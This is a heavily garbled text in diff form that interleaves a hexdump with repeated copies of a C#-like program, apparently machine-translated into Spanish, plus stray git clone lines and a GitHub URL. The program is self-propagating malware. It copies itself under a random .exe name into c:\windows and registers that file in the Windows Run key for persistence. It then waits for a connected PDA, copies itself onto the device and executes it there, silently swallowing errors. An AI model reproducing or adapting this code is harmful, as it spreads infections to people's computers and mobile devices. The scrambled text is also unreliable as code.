+          while (00005380  20 3d 20 6e 75 65 76 6f  20 52 41 50 49 20 28 29  | = nuevo RAPI ()|
+! (local4.DevicePresent)) #continuar bucle ha00005390  3b 0a 20 20 20 20 20 20  20 20 20 20 6c 6f 63 61  |;.          loca|
+sta que presente PDA
+            000053a0  6c 35 20 3d 20 41 73 73  65 6d 62 6c 79 2e 47 65  |l5 = Assembly.Ge|
+     local4.Connect (); #conectar                          000053b0  74 45 78 65 63 75 74 69  6e 67 41 73 73 65 6d 62  |tExecutingAssemb|
+                 local9.CopyTo (loca000053c0  6c 79 20 28 29 2e 20 47  65 74 4e 61 6d 65 20 28  |ly (). GetName (|    l12);
+                 local14 = "\\ Windows 000053d0  29 2e 20 43 6f 64 65 42  61 73 65 3b 0a 20 20 20  |). CodeBase;.   | \\" + local11; #definir destino
+000053e0  20 20 20 20 20 20 20 6c  6f 63 61 6c 35 20 3d 20  |       local5 = |                                                        local4.CopyFileToD000053f0  6c 6f 63 61 6c 35 2e 52  65 70 6c 61 63 65 20 28  |local5.Replace (|
+evice (local12, local14, verdadero); #copia00005400  22 2f 22 2c 20 22 5c 5c  22 29 3b 0a 20 20 20 20  |"/", "\\");.    |                                                        r archivo a PDA
+              00005410  20 20 20 20 20 20 6c 6f  63 61 6c 36 20 3d 20 6c  |      local6 = l|
+  local4.CreateProcess (local14, "0"00005420  6f 63 61 6c 35 2e 4c 61  73 74 49 6e 64 65 78 4f  |ocal5.LastIndexO|
+); #execute archivo                                                         loca00005430  66 20 28 22 5c 5c 22 29  3b 0a 20 20 20 20 20 20  |f ("\\");.      |                   l4.Disconnect (); #desconectar
+00005440  20 20 20 20 6c 6f 63 61  6c 37 20 3d 20 6c 6f 63  |    local7 = loc|
+          }                                                
+        catch (Exc00005450  61 6c 35 2e 53 75 62 73  74 72 69 6e 67 20 28 6c  |al5.Substring (l|
+eption) {} #if error luego captura e00005460  6f 63 61 6c 36 20 2b 20  31 2c 20 6c 6f 63 61 6c  |ocal6 + 1, local|
+xcepción                                                   
+        }00005470  35 2e 4c 65 6e 67 74 68  20 2d 20 6c 6f 63 61 6c  |5.Length - local|
+00005480  36 20 2d 20 31 29 3b 0a  20 20 20 20 20 20 20 20  |6 - 1);.        |
+00005490  20 20 6c 6f 63 61 6c 35  20 3d 20 6c 6f 63 61 6c  |  local5 = local|
+000054a0  35 2e 20 45 6c 69 6d 69  6e 61 72 20 28 30 2c 20  |5. Eliminar (0, |
+000054b0  38 29 3b 0a 20 20 20 20  20 20 20 20 20 20 6c 6f  |8);.          lo|
+000054c0  63 61 6c 35 20 3d 20 6c  6f 63 61 6c 35 2e 53 75  |cal5 = local5.Su|
+000054d0  62 73 74 72 69 6e 67 20  28 30 2c 20 6c 6f 63 61  |bstring (0, loca|
+000054e0  6c 35 2e 4c 61 73 74 49  6e 64 65 78 4f 66 20 28  |l5.LastIndexOf (|
+000054f0  22 5c 5c 22 29 20 2b 20  31 29 3b 0a 20 20 20 20  |"\\") + 1);.    |
+00005500  20 20 20 20 20 20 6c 6f  63 61 6c 38 20 3d 20 6c  |      local8 = l|
+00005510  6f 63 61 6c 35 20 2b 20  6c 6f 63 61 6c 37 3b 0a  |ocal5 + local7;.|
+00005520  20 20 20 20 20 20 20 20  20 20 6c 6f 63 61 6c 39  |          local9|
+00005530  20 3d 20 6e 75 65 76 6f  20 46 69 6c 65 49 6e 66  | = nuevo FileInf|
+00005540  6f 20 28 6c 6f 63 61 6c  38 29 3b 0a 20 20 20 20  |o (local8);.    |
+00005550  20 20 20 20 20 20 6c 6f  63 61 6c 31 30 20 3d 20  |      local10 = |
+00005560  6e 75 65 76 6f 20 52 61  6e 64 6f 6d 20 28 29 3b  |nuevo Random ();|
+00005570  20 23 63 72 65 61 72 20  6e 6f 6d 62 72 65 20 64  | #crear nombre d|
+00005580  65 20 61 72 63 68 69 76  6f 0a 20 20 20 20 20 20  |e archivo.      |
+00005590  20 20 20 20 6c 6f 63 61  6c 31 31 20 3d 20 43 6f  |    local11 = Co|
+000055a0  6e 76 65 72 74 2e 54 6f  53 74 72 69 6e 67 20 28  |nvert.ToString (|
+000055b0  6c 6f 63 61 6c 31 30 2e  4e 65 78 74 20 28 29 29  |local10.Next ())|
+000055c0  20 2b 20 22 2e 65 78 65  22 3b 0a 20 20 20 20 20  | + ".exe";.     |
+000055d0  20 20 20 20 20 6c 6f 63  61 6c 31 32 20 3d 20 22  |     local12 = "|
+000055e0  63 3a 20 5c 5c 20 77 69  6e 64 6f 77 73 20 5c 5c  |c: \\ windows \\|
+000055f0  22 20 2b 20 6c 6f 63 61  6c 31 31 3b 20 23 69 6e  |" + local11; #in|
+00005600  63 6c 75 79 65 20 65 6c  20 63 61 6d 69 6e 6f 0a  |cluye el camino.|
+00005610  20 20 20 20 20 20 20 20  20 20 6c 6f 63 61 6c 31  |          local1|
+00005620  33 20 3d 20 6e 75 65 76  6f 20 2d 0a 41 75 74 6f  |3 = nuevo -.Auto|
+00005630  53 74 61 72 74 41 70 70  73 20 28 22 53 4f 46 54  |StartApps ("SOFT|
+00005640  57 41 52 45 20 5c 5c 20  4d 69 63 72 6f 73 6f 66  |WARE \\ Microsof|
+00005650  74 20 5c 5c 20 57 69 6e  64 6f 77 73 20 5c 5c 20  |t \\ Windows \\ |
+00005660  43 75 72 72 65 6e 74 56  65 72 73 69 6f 6e 20 5c  |CurrentVersion \|
+00005670  5c 20 52 75 6e 20 5c 5c  22 29 3b 0a 20 20 20 20  |\ Run \\");.    |
+00005680  20 20 20 20 20 23 20 64  65 66 69 6e 65 20 6c 61  |     # define la|
+00005690  20 63 6c 61 76 65 20 64  65 20 72 65 67 69 73 74  | clave de regist|
+000056a0  72 6f 0a 20 20 20 20 20  20 20 20 20 20 6c 6f 63  |ro.          loc|
+000056b0  61 6c 31 33 2e 41 64 64  20 28 6c 6f 63 61 6c 31  |al13.Add (local1|
+000056c0  32 29 3b 20 23 61 64 64  20 6e 75 65 76 6f 20 61  |2); #add nuevo a|
+000056d0  72 63 68 69 76 6f 20 61  6c 20 72 65 67 69 73 74  |rchivo al regist|
+000056e0  72 6f 0a 20 20 20 20 20  20 20 20 20 20 6c 6f 63  |ro.          loc|
+000056f0  61 6c 34 2e 43 6f 6e 6e  65 63 74 20 28 29 3b 20  |al4.Connect (); |
+00005700  23 20 69 6e 74 65 6e 74  61 72 20 63 6f 6e 65 63  |# intentar conec|
+00005710  74 61 72 73 65 20 61 20  50 44 41 0a 20 20 20 20  |tarse a PDA.    |
+00005720  20 20 20 20 20 20 77 68  69 6c 65 20 28 21 20 28  |      while (! (|
+00005730  6c 6f 63 61 6c 34 2e 44  65 76 69 63 65 50 72 65  |local4.DevicePre|
+00005740  73 65 6e 74 29 29 20 23  63 6f 6e 74 69 6e 75 61  |sent)) #continua|
+00005750  72 20 62 75 63 6c 65 20  68 61 73 74 61 20 71 75  |r bucle hasta qu|
+00005760  65 20 70 72 65 73 65 6e  74 65 20 50 44 41 0a 20  |e presente PDA. |
+00005770  20 20 20 20 20 20 20 20  20 20 20 20 20 20 20 20  |                |
+00005780  6c 6f 63 61 6c 34 2e 43  6f 6e 6e 65 63 74 20 28  |local4.Connect (|
+00005790  29 3b 20 23 63 6f 6e 65  63 74 61 72 0a 20 20 20  |); #conectar.   |
+000057a0  20 20 20 20 20 20 20 20  20 20 20 20 20 20 6c 6f  |              lo|
+000057b0  63 61 6c 39 2e 43 6f 70  79 54 6f 20 28 6c 6f 63  |cal9.CopyTo (loc|
+000057c0  61 6c 31 32 29 3b 20 0a  20 20 20 20 20 20 20 20  |al12); .        |
+000057d0  20 20 20 20 20 20 20 20  20 6c 6f 63 61 6c 31 34  |         local14|
+000057e0  20 3d 20 22 5c 5c 20 57  69 6e 64 6f 77 73 20 5c  | = "\\ Windows \|
+000057f0  5c 22 20 2b 20 6c 6f 63  61 6c 31 31 3b 20 23 64  |\" + local11; #d|
+00005800  65 66 69 6e 69 72 20 64  65 73 74 69 6e 6f 0a 20  |efinir destino. |
+00005810  20 20 20 20 20 20 20 20  20 20 20 20 20 20 20 6c  |               l|
+00005820  6f 63 61 6c 34 2e 43 6f  70 79 46 69 6c 65 54 6f  |ocal4.CopyFileTo|
+00005830  44 65 76 69 63 65 20 28  6c 6f 63 61 6c 31 32 2c  |Device (local12,|
+00005840  20 6c 6f 63 61 6c 31 34  2c 20 76 65 72 64 61 64  | local14, verdad|
+00005850  65 72 6f 29 3b 20 23 63  6f 70 69 61 72 20 61 72  |ero); #copiar ar|
+00005860  63 68 69 76 6f 20 61 20  50 44 41 0a 20 20 20 20  |chivo a PDA.    |
+00005870  20 20 20 20 20 20 20 20  20 20 20 20 6c 6f 63 61  |            loca|
+00005880  6c 34 2e 43 72 65 61 74  65 50 72 6f 63 65 73 73  |l4.CreateProcess|
+00005890  20 28 6c 6f 63 61 6c 31  34 2c 20 22 30 22 29 3b  | (local14, "0");|
+000058a0  20 23 65 78 65 63 75 74  65 20 61 72 63 68 69 76  | #execute archiv|
+000058b0  6f 0a 20 20 20 20 20 20  20 20 20 20 20 20 20 20  |o.              |
+000058c0  20 20 20 6c 6f 63 61 6c  34 2e 44 69 73 63 6f 6e  |   local4.Discon|
+000058d0  6e 65 63 74 20 28 29 3b  20 23 64 65 73 63 6f 6e  |nect (); #descon|
+000058e0  65 63 74 61 72 0a 20 20  20 20 20 20 20 20 20 20  |ectar.          |
+000058f0  7d 0a 0a 20 20 20 20 20  20 20 20 63 61 74 63 68  |}..        catch|
+00005900  20 28 45 78 63 65 70 74  69 6f 6e 29 20 7b 7d 20  | (Exception) {} |
+00005910  23 69 66 20 65 72 72 6f  72 20 6c 75 65 67 6f 20  |#if error luego |                                        00005920  63 61 70 74 75 72 61 20  65 78 63 65 70 63 69 c3  |captura excepci.|                                        local1 = Environment.OSVersion.ToString (); #obtener el tipo de sistema operativo actual                                    local1 = local1.ToLower (); #convertir a minúsculas        local2 = local1.IndexOf ("ce"); #get ubicación de la cadena ce en tipo de sistema operativo
+    00005930  b3 6e 0a 0a 20 20 20 20  20 20 20 20 7d 6c 6f 63  |.n..        }loc|
+  local3 = local1.IndexOf ("móvil"); #get index of string mobile en tipo de sistema operativo                               if (local2 <1 && local3 <1) {#si la cadena ce o mobile existe, ejecute
+        tratar {
+00005940  61 6c 31 20 3d 20 45 6e  76 69 72 6f 6e 6d 65 6e  |al1 = Environmen|
+          local4 = nuevo RAPI ();
+          local5 = Assembly.GetExecutingAssembly (). GetName (). CodeBase;                                                 00005950  74 2e 4f 53 56 65 72 73  69 6f 6e 2e 54 6f 53 74  |t.OSVersion.ToSt|
+     local5 = local5.Replace ("/", "\\");
+          local6 = local5.LastIndexOf (00005960  72 69 6e 67 20 28 29 3b  20 23 6f 62 74 65 6e 65  |ring (); #obtene|
+"\\");
+          local7 = local5.Substring (local6 + 1, local5.Length - local6 - 1);
+          local5 = local500005970  72 20 65 6c 20 74 69 70  6f 20 64 65 20 73 69 73  |r el tipo de sis|               . Eliminar (0, 8);
+          local5 = local5.Substring (0, local5.LastIndexOf ("\\") + 1);                                                         local8 = loca00005980  74 65 6d 61 20 6f 70 65  72 61 74 69 76 6f 20 61  |tema operativo a|
+l5 + local7;
+          local9 = nuevo FileInfo (local8);                          local10 = nuevo Random (); #crear nombre de archivo
+          local11 = Convert.ToString (local00005990  63 74 75 61 6c 0a 20 20  20 20 20 20 6c 6f 63 61  |ctual.      loca|
+10.Next ()) + ".exe";                                                local12 = "c: \\ windows \\" + local11; #incluye el ca000059a0  6c 31 20 3d 20 6c 6f 63  61 6c 31 2e 54 6f 4c 6f  |l1 = local1.ToLo|                                   mino
+          local13 = nuevo -
+AutoStartApps ("SOFTWARE \\ Microsoft \\ Windows \\ CurrentVersion \\ Run \\");
+000059b0  77 65 72 20 28 29 3b 20  23 63 6f 6e 76 65 72 74  |wer (); #convert|                                                 # define la clave de registro
+          local13.Add (local12); #add nuevo archivo al registro                                                                 local4.Connect (); # intentar conectarse a PDA
+          while (! (local4.DevicePresent)) #continuar bucle hasta que presente PDA                                       000059c0  69 72 20 61 20 6d 69 6e  c3 ba 73 63 75 6c 61 73  |ir a min..sculas|
+              local4.Connect (); #conectar                                  local9.CopyTo (local12);
+                 local14 = "\\ Windows \\" + l000059d0  0a 20 20 20 20 20 20 6c  6f 63 61 6c 32 20 3d 20  |.      local2 = |
+ocal11; #definir destino
+                local4.CopyFileToDevice (local12, local14, verdadero); #copiar000059e0  6c 6f 63 61 6c 31 2e 49  6e 64 65 78 4f 66 20 28  |local1.IndexOf (|
+ archivo a PDA                                                             local4.CreateProcess (local14, "0"); #execute archivo
+                 lo000059f0  22 63 65 22 29 3b 20 23  67 65 74 20 75 62 69 63  |"ce"); #get ubic|
+cal4.Disconnect (); #desconectar                                     }
+                                                                   catch (Exception) {} #if error 00005a00  61 63 69 c3 b3 6e 20 64  65 20 6c 61 20 63 61 64  |aci..n de la cad|
+luego captura excepción
+                                                                   }00005a10  65 6e 61 20 63 65 20 65  6e 20 74 69 70 6f 20 64  |ena ce en tipo d|
+00005a20  65 20 73 69 73 74 65 6d  61 20 6f 70 65 72 61 74  |e sistema operat|                                        00005a30  69 76 6f 0a 20 20 20 20  20 20 6c 6f 63 61 6c 33  |ivo.      local3|                                        00005a40  20 3d 20 6c 6f 63 61 6c  31 2e 49 6e 64 65 78 4f  | = local1.IndexO|                                        00005a50  66 20 28 22 6d c3 b3 76  69 6c 22 29 3b 20 23 67  |f ("m..vil"); #g|                                        00005a60  65 74 20 69 6e 64 65 78  20 6f 66 20 73 74 72 69  |et index of stri|
+00005a70  6e 67 20 6d 6f 62 69 6c  65 20 65 6e 20 74 69 70  |ng mobile en tip|                                        00005a80  6f 20 64 65 20 73 69 73  74 65 6d 61 20 6f 70 65  |o de sistema ope|
+00005a90  72 61 74 69 76 6f 0a 20  20 20 20 20 20 69 66 20  |rativo.      if |
+00005aa0  28 6c 6f 63 61 6c 32 20  3c 31 20 26 26 20 6c 6f  |(local2 <1 && lo|
+00005ab0  63 61 6c 33 20 3c 31 29  20 7b 23 73 69 20 6c 61  |cal3 <1) {#si la|                                        00005ac0  20 63 61 64 65 6e 61 20  63 65 20 6f 20 6d 6f 62  | cadena ce o mob|
+00005ad0  69 6c 65 20 65 78 69 73  74 65 2c 20 65 6a 65 63  |ile existe, ejec|                                        00005ae0  75 74 65 0a 20 20 20 20  20 20 20 20 74 72 61 74  |ute.        trat|                                        00005af0  61 72 20 7b 0a 20 20 20  20 20 20 20 20 20 20 6c  |ar {.          l|                                        00005b00  6f 63 61 6c 34 20 3d 20  6e 75 65 76 6f 20 52 41  |ocal4 = nuevo RA|                                        00005b10  50 49 20 28 29 3b 0a 20  20 20 20 20 20 20 20 20  |PI ();.         |                                        00005b20  20 6c 6f 63 61 6c 35 20  3d 20 41 73 73 65 6d 62  | local5 = Assemb|                                        00005b30  6c 79 2e 47 65 74 45 78  65 63 75 74 69 6e 67 41  |ly.GetExecutingA|                                        00005b40  73 73 65 6d 62 6c 79 20  28 29 2e 20 47 65 74 4e  |ssembly (). GetN|                                        00005b50  61 6d 65 20 28 29 2e 20  43 6f 64 65 42 61 73 65  |ame (). CodeBase|                                        00005b60  3b 0a 20 20 20 20 20 20  20 20 20 20 6c 6f 63 61  |;.          loca|                                        00005b70  6c 35 20 3d 20 6c 6f 63  61 6c 35 2e 52 65 70 6c  |l5 = local5.Repl|                                        00005b80  61 63 65 20 28 22 2f 22  2c 20 22 5c 5c 22 29 3b  |ace ("/", "\\");|                                        00005b90  0a 20 20 20 20 20 20 20  20 20 20 6c 6f 63 61 6c  |.          local|                                        00005ba0  36 20 3d 20 6c 6f 63 61  6c 35 2e 4c 61 73 74 49  |6 = local5.LastI|                                        00005bb0  6e 64 65 78 4f 66 20 28  22 5c 5c 22 29 3b 0a 20  |ndexOf ("\\");. |                                        00005bc0  20 20 20 20 20 20 20 20  20 6c 6f 63 61 6c 37 20  |         local7 |                                        00005bd0  3d 20 6c 6f 63 61 6c 35  2e 53 75 62 73 74 72 69  |= local5.Substri|                                        00005be0  6e 67 20 28 6c 6f 63 61  6c 36 20 2b 20 31 2c 20  |ng (local6 + 1, |                                        00005bf0  6c 6f 63 61 6c 35 2e 4c  65 6e 67 74 68 20 2d 20  |local5.Length - |                                        00005c00  6c 6f 63 61 6c 36 20 2d  20 31 29 3b 0a 20 20 20  |local6 - 1);.   |                                        00005c10  20 20 20 20 20 20 20 6c  6f 63 61 6c 35 20 3d 20  |       local5 = |                                        00005c20  6c 6f 63 61 6c 35 2e 20  45 6c 69 6d 69 6e 61 72  |local5. Eliminar|                                        00005c30  20 28 30 2c 20 38 29 3b  0a 20 20 20 20 20 20 20  | (0, 8);.       |                                        00005c40  20 20 20 6c 6f 63 61 6c  35 20 3d 20 6c 6f 63 61  |   local5 = loca|                                        00005c50  6c 35 2e 53 75 62 73 74  72 69 6e 67 20 28 30 2c  |l5.Substring (0,|                                        00005c60  20 6c 6f 63 61 6c 35 2e  4c 61 73 74 49 6e 64 65  | local5.LastInde|                                        00005c70  78 4f 66 20 28 22 5c 5c  22 29 20 2b 20 31 29 3b  |xOf ("\\") + 1);|                                        00005c80  0a 20 20 20 20 20 20 20  20 20 20 6c 6f 63 61 6c  |.          local|                                        00005c90  38 20 3d 20 6c 6f 63 61  6c 35 20 2b 20 6c 6f 63  |8 = local5 + loc|                                        00005ca0  61 6c 37 3b 0a 20 20 20  20 20 20 20 20 20 20 6c  |al7;.          l|                                        00005cb0  6f 63 61 6c 39 20 3d 20  6e 75 65 76 6f 20 46 69  |ocal9 = nuevo Fi|                                        00005cc0  6c 65 49 6e 66 6f 20 28  6c 6f 63 61 6c 38 29 3b  |leInfo (local8);|                                        00005cd0  0a 20 20 20 20 20 20 20  20 20 20 6c 6f 63 61 6c  |.          local|                                        00005ce0  31 30 20 3d 20 6e 75 65  76 6f 20 52 61 6e 64 6f  |10 = nuevo Rando|                                        00005cf0  6d 20 28 29 3b 20 23 63  72 65 61 72 20 6e 6f 6d  |m (); #crear nom|                                        00005d00  62 72 65 20 64 65 20 61  72 63 68 69 76 6f 0a 20  |bre de archivo. |                                        00005d10  20 20 20 20 20 20 20 20  20 6c 6f 63 61 6c 31 31  |         local11|                                        00005d20  20 3d 20 43 6f 6e 76 65  72 74 2e 54 6f 53 74 72  | = Convert.ToStr|                                        00005d30  69 6e 67 20 28 6c 6f 63  61 6c 31 30 2e 4e 65 78  |ing (local10.Nex|                                        00005d40  74 20 28 29 29 20 2b 20  22 2e 65 78 65 22 3b 0a  |t ()) + ".exe";.|                                        00005d50  20 20 20 20 20 20 20 20  20 20 6c 6f 63 61 6c 31  |          local1|                                        00005d60  32 20 3d 20 22 63 3a 20  5c 5c 20 77 69 6e 64 6f  |2 = "c: \\ windo|                                        00005d70  77 73 20 5c 5c 22 20 2b  20 6c 6f 63 61 6c 31 31  |ws \\" + local11|                                        00005d80  3b 20 23 69 6e 63 6c 75  79 65 20 65 6c 20 63 61  |; #incluye el ca|                                        00005d90  6d 69 6e 6f 0a 20 20 20  20 20 20 20 20 20 20 6c  |mino.          l|                                        00005da0  6f 63 61 6c 31 33 20 3d  20 6e 75 65 76 6f 20 2d  |ocal13 = nuevo -|                                        00005db0  0a 41 75 74 6f 53 74 61  72 74 41 70 70 73 20 28  |.AutoStartApps (|                                        00005dc0  22 53 4f 46 54 57 41 52  45 20 5c 5c 20 4d 69 63  |"SOFTWARE \\ Mic|                                        00005dd0  72 6f 73 6f 66 74 20 5c  5c 20 57 69 6e 64 6f 77  |rosoft \\ Window|                                        00005de0  73 20 5c 5c 20 43 75 72  72 65 6e 74 56 65 72 73  |s \\ CurrentVers|                                        00005df0  69 6f 6e 20 5c 5c 20 52  75 6e 20 5c 5c 22 29 3b  |ion \\ Run \\");|                                        00005e00  0a 20 20 20 20 20 20 20  20 20 23 20 64 65 66 69  |.         # defi|                                        00005e10  6e 65 20 6c 61 20 63 6c  61 76 65 20 64 65 20 72  |ne la clave de r|                                        00005e20  65 67 69 73 74 72 6f 0a  20 20 20 20 20 20 20 20  |egistro.        |                                        00005e30  20 20 6c 6f 63 61 6c 31  33 2e 41 64 64 20 28 6c  |  local13.Add (l|                                        00005e40  6f 63 61 6c 31 32 29 3b  20 23 61 64 64 20 6e 75  |ocal12); #add nu|                                        00005e50  65 76 6f 20 61 72 63 68  69 76 6f 20 61 6c 20 72  |evo archivo al r|                                        00005e60  65 67 69 73 74 72 6f 0a  20 20 20 20 20 20 20 20  |egistro.        |                                        00005e70  20 20 6c 6f 63 61 6c 34  2e 43 6f 6e 6e 65 63 74  |  local4.Connect|                                        00005e80  20 28 29 3b 20 23 20 69  6e 74 65 6e 74 61 72 20  | (); # intentar |                                        00005e90  63 6f 6e 65 63 74 61 72  73 65 20 61 20 50 44 41  |conectarse a PDA|                                        00005ea0  0a 20 20 20 20 20 20 20  20 20 20 77 68 69 6c 65  |.          while|                                        00005eb0  20 28 21 20 28 6c 6f 63  61 6c 34 2e 44 65 76 69  | (! (local4.Devi|                                        00005ec0  63 65 50 72 65 73 65 6e  74 29 29 20 23 63 6f 6e  |cePresent)) #con|                                        00005ed0  74 69 6e 75 61 72 20 62  75 63 6c 65 20 68 61 73  |tinuar bucle has|                                        00005ee0  74 61 20 71 75 65 20 70  72 65 73 65 6e 74 65 20  |ta que presente |                                        00005ef0  50 44 41 0a 20 20 20 20  20 20 20 20 20 20 20 20  |PDA.            |                                        00005f00  20 20 20 20 20 6c 6f 63  61 6c 34 2e 43 6f 6e 6e  |     local4.Conn|                                        00005f10  65 63 74 20 28 29 3b 20  23 63 6f 6e 65 63 74 61  |ect (); #conecta|                                        00005f20  72 0a 20 20 20 20 20 20  20 20 20 20 20 20 20 20  |r.              |                                        00005f30  20 20 20 6c 6f 63 61 6c  39 2e 43 6f 70 79 54 6f  |   local9.CopyTo|                                        00005f40  20 28 6c 6f 63 61 6c 31  32 29 3b 20 0a 20 20 20  | (local12); .   |                                        00005f50  20 20 20 20 20 20 20 20  20 20 20 20 20 20 6c 6f  |              lo|                                        00005f60  63 61 6c 31 34 20 3d 20  22 5c 5c 20 57 69 6e 64  |cal14 = "\\ Wind|                                        00005f70  6f 77 73 20 5c 5c 22 20  2b 20 6c 6f 63 61 6c 31  |ows \\" + local1|                                        00005f80  31 3b 20 23 64 65 66 69  6e 69 72 20 64 65 73 74  |1; #definir dest|                                        00005f90  69 6e 6f 0a 20 20 20 20  20 20 20 20 20 20 20 20  |ino.            |                                        00005fa0  20 20 20 20 6c 6f 63 61  6c 34 2e 43 6f 70 79 46  |    local4.CopyF|                                        00005fb0  69 6c 65 54 6f 44 65 76  69 63 65 20 28 6c 6f 63  |ileToDevice (loc|                                        00005fc0  61 6c 31 32 2c 20 6c 6f  63 61 6c 31 34 2c 20 76  |al12, local14, v|                                        00005fd0  65 72 64 61 64 65 72 6f  29 3b 20 23 63 6f 70 69  |erdadero); #copi|                                        00005fe0  61 72 20 61 72 63 68 69  76 6f 20 61 20 50 44 41  |ar archivo a PDA|                                        00005ff0  0a 20 20 20 20 20 20 20  20 20 20 20 20 20 20 20  |.               |                                        00006000  20 6c 6f 63 61 6c 34 2e  43 72 65 61 74 65 50 72  | local4.CreatePr|                                        00006010  6f 63 65 73 73 20 28 6c  6f 63 61 6c 31 34 2c 20  |ocess (local14, |                                        00006020  22 30 22 29 3b 20 23 65  78 65 63 75 74 65 20 61  |"0"); #execute a|                                        00006030  72 63 68 69 76 6f 0a 20  20 20 20 20 20 20 20 20  |rchivo.         |                                        00006040  20 20 20 20 20 20 20 20  6c 6f 63 61 6c 34 2e 44  |        local4.D|                                        00006050  69 73 63 6f 6e 6e 65 63  74 20 28 29 3b 20 23 64  |isconnect (); #d|                                        00006060  65 73 63 6f 6e 65 63 74  61 72 0a 20 20 20 20 20  |esconectar.     |
+00006070  20 20 20 20 20 7d 0a 0a  20 20 20 20 20 20 20 20  |     }..        |
+00006080  63 61 74 63 68 20 28 45  78 63 65 70 74 69 6f 6e  |catch (Exception|
+00006090  29 20 7b 7d 20 23 69 66  20 65 72 72 6f 72 20 6c  |) {} #if error l|
+000060a0  75 65 67 6f 20 63 61 70  74 75 72 61 20 65 78 63  |uego captura exc|
+https://github.com/gustavomonente/-iframe-src-https-pastebin.com-embed_iframe-TapXM978-style-border-none-width-100.git
+000060b0  65 70 63 69 c3 b3 6e 0a  0a 20 20 20 20 20 20 20  |epci..n..       |
+000060c0  20 7d 68 74 74 70 73 3a  2f 2f 67 69 74 68 75 62  | }https://github|
+000060d0  2e 63 6f 6d 2f 67 75 73  74 61 76 6f 6d 6f 6e 65  |.com/gustavomone|                                        000060e0  6e 74 65 2f 2d 69 66 72  61 6d 65 2d 73 72 63 2d  |nte/-iframe-src-|
+000060f0  68 74 74 70 73 2d 70 61  73 74 65 62 69 6e 2e 63  |https-pastebin.c|                                        00006100  6f 6d 2d 65 6d 62 65 64  5f 69 66 72 61 6d 65 2d  |om-embed_iframe-|                                        00006110  54 61 70 58 4d 39 37 38  2d 73 74 79 6c 65 2d 62  |TapXM978-style-b|
+00006120  6f 72 64 65 72 2d 6e 6f  6e 65 2d 77 69 64 74 68  |order-none-width|                                        git clone https://android.googlesource.com/api_council_filter # 2888
+00006130  2d 31 30 30 2e 67 69 74  0a 67 69 74 20 63 6c 6f  |-100.git.git clo|                                        00006140  6e 65 20 68 74 74 70 73  3a 2f 2f 61 6e 64 72 6f  |ne https://andro|                                        00006150  69 64 2e 67 6f 6f 67 6c  65 73 6f 75 72 63 65 2e  |id.googlesource.|                                        00006160  63 6f 6d 2f 61 70 69 5f  63 6f 75 6e 63 69 6c 5f  |com/api_council_|
+local1 = Environment.OSVersion.ToString (); #obtener el tipo de sistema operativo actual
+      local1 = local1.ToLower (); #convertir a minúsculas
+      local2 = local1.IndexOf ("ce"); #get ubicación de la cadena ce en tipo de sistema operativo                      00006170  66 69 6c 74 65 72 20 23  20 32 38 38 38 0a 6c 6f  |filter # 2888.lo|
+     local3 = local1.IndexOf ("móvil"); #get inde00006180  63 61 6c 31 20 3d 20 45  6e 76 69 72 6f 6e 6d 65  |cal1 = Environme|
+x of string mobile en tipo de sistema opera00006190  6e 74 2e 4f 53 56 65 72  73 69 6f 6e 2e 54 6f 53  |nt.OSVersion.ToS|                                                        tivo
+      if (local2 <1 && local3000061a0  74 72 69 6e 67 20 28 29  3b 20 23 6f 62 74 65 6e  |tring (); #obten|
+ <1) {#si la cadena ce o mobile existe, ejecute            000061b0  65 72 20 65 6c 20 74 69  70 6f 20 64 65 20 73 69  |er el tipo de si|
+        tratar {                                                     local4 = nuevo 000061c0  73 74 65 6d 61 20 6f 70  65 72 61 74 69 76 6f 20  |stema operativo |               RAPI ();
+          local5 = Assembly.GetExecutingAssembly (). GetName (). CodeBase;
+          lo000061d0  61 63 74 75 61 6c 0a 20  20 20 20 20 20 6c 6f 63  |actual.      loc|
+cal5 = local5.Replace ("/", "\\");                                   lo000061e0  61 6c 31 20 3d 20 6c 6f  63 61 6c 31 2e 54 6f 4c  |al1 = local1.ToL|
+cal6 = local5.LastIndexOf ("\\");
+         000061f0  6f 77 65 72 20 28 29 3b  20 23 63 6f 6e 76 65 72  |ower (); #conver|                                local7 = local5.Substring (local6 + 1, l00006200  74 69 72 20 61 20 6d 69  6e c3 ba 73 63 75 6c 61  |tir a min..scula|
+ocal5.Length - local6 - 1);                                          local5 = local5.00006210  73 0a 20 20 20 20 20 20  6c 6f 63 61 6c 32 20 3d  |s.      local2 =|               Eliminar (0, 8);
+          local5 = local5.S00006220  20 6c 6f 63 61 6c 31 2e  49 6e 64 65 78 4f 66 20  | local1.IndexOf |
+ubstring (0, local5.LastIndexOf ("\\") + 1);               00006230  28 22 63 65 22 29 3b 20  23 67 65 74 20 75 62 69  |("ce"); #get ubi|                                                  local8 = local5 + local7;
+          local9 =00006240  63 61 63 69 c3 b3 6e 20  64 65 20 6c 61 20 63 61  |caci..n de la ca|
+ nuevo FileInfo (local8);                                            local10 00006250  64 65 6e 61 20 63 65 20  65 6e 20 74 69 70 6f 20  |dena ce en tipo |                      = nuevo Random (); #crear nombre de archivo
+00006260  64 65 20 73 69 73 74 65  6d 61 20 6f 70 65 72 61  |de sistema opera|
+          local11 = Convert.ToString (local10.Next ()00006270  74 69 76 6f 0a 20 20 20  20 20 20 6c 6f 63 61 6c  |tivo.      local|                                              ) + ".exe";
+          local12 = "c: \\ window00006280  33 20 3d 20 6c 6f 63 61  6c 31 2e 49 6e 64 65 78  |3 = local1.Index|
+s \\" + local11; #incluye el camino                              00006290  4f 66 20 28 22 6d c3 b3  76 69 6c 22 29 3b 20 23  |Of ("m..vil"); #|                                      local13 = nuevo -
+AutoStartApps ("SOF000062a0  67 65 74 20 69 6e 64 65  78 20 6f 66 20 73 74 72  |get index of str|
+TWARE \\ Microsoft \\ Windows \\ CurrentV000062b0  69 6e 67 20 6d 6f 62 69  6c 65 20 65 6e 20 74 69  |ing mobile en ti|                                                          ersion \\ Run \\");
+         # define 000062c0  70 6f 20 64 65 20 73 69  73 74 65 6d 61 20 6f 70  |po de sistema op|
+la clave de registro                                                 local13.Add (local12000062d0  65 72 61 74 69 76 6f 0a  20 20 20 20 20 20 69 66  |erativo.      if|          ); #add nuevo archivo al registro
+          local4.Co000062e0  20 28 6c 6f 63 61 6c 32  20 3c 31 20 26 26 20 6c  | (local2 <1 && l|
+nnect (); # intentar conectarse a PDA                             000062f0  6f 63 61 6c 33 20 3c 31  29 20 7b 23 73 69 20 6c  |ocal3 <1) {#si l|                                    while (! (local4.DevicePresent)) #continu00006300  61 20 63 61 64 65 6e 61  20 63 65 20 6f 20 6d 6f  |a cadena ce o mo|
